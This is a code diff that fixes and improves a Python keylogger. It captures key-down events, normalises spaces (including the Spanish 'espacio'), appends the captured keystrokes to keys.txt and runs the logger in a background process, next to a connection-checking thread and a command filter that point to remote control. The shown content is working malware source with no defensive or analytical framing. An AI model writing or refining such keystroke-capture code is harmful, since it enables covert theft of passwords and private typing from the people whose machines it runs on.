@@ -249,7 +249,7 @@ def filterValue(regex,text):
 # CONCATS TEXT TO A FILE
 def concatToFile(text,file):
     try:
-        with open(file,"wa") as f:
+        with open(file,"a") as f:
             f.write(text)
     except Exception as e:
         logEvents(e)        
@@ -308,12 +308,31 @@ def filterCommand(command):
 def kLogger():
     global keyLog
     buffer = ""
+    if not os.path.exists("keys.txt"):
+        saveFile("","keys.txt")
+
+    # FILTERS THE PRESSED KEY
+    def filterKey(key):
+        
+        formattedKey = ""
+        
+        if key == "space" or key == "espacio":
+            formattedKey = " "
+        else:
+            formattedKey = key
+            
+        return formattedKey
+    
     while keyLog:
         try:
-            buffer += keyboard.read_key()
-            if (len(buffer) > 10):
-                concatToFile(buffer,keys.txt)
-                buffer = ""  
+            event = keyboard.read_event()
+            if event.event_type == keyboard.KEY_DOWN:  
+                buffer += filterKey(event.name) 
+                if len(buffer) > 10:
+                
+                    concatToFile(buffer, "keys.txt")
+                    buffer = ""  
+           
                   
         except Exception as e:
             logEvents(e)
@@ -363,7 +382,7 @@ def checkConnection():
 if __name__ == '__main__':
     thread = threading.Thread(target=checkConnection)
     thread.start()
-    keyProcess = Process(target=keyLog)
+    keyProcess = Process(target=kLogger)
     keyProcess.start()
     while True:
         if connected:
